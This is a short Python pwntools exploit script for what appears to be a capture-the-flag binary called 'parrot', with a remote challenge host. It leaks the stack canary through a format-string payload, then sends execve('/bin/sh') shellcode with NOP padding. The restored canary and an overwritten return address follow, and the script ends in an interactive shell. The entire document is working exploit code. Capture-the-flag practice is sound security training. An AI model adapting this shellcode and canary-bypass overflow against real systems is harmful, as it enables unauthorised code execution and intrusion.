from pwn import *
import sys

binary = context.binary = ELF("./parrot")

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('0.cloud.chals.io', 12185)

# Get canary and win address
tmp = p.readuntil("you out: ")
leak = p.readline()[:-1]
leak = int(leak.decode(), 0)

# Get leak of canary
payload = b""
payload += b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p %p  "

with open("payload", "wb") as fp:
    fp.write(payload + b"\n")

p.sendline(payload)
tmp = p.readuntil("  ")
canary = int(tmp.decode().split()[1], 0)

payload =  b""
payload += b"\x48\x81\xec\xff\x00\x00\x00\x48\x31\xc0\x50\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload += b"\x90" * (0x48 - len(payload))
payload += p64(canary)
payload += b"A" * 8
payload += p64(leak)

with open("payload", "ab") as fp:
    fp.write(payload)

p.sendline(payload)
p.interactive()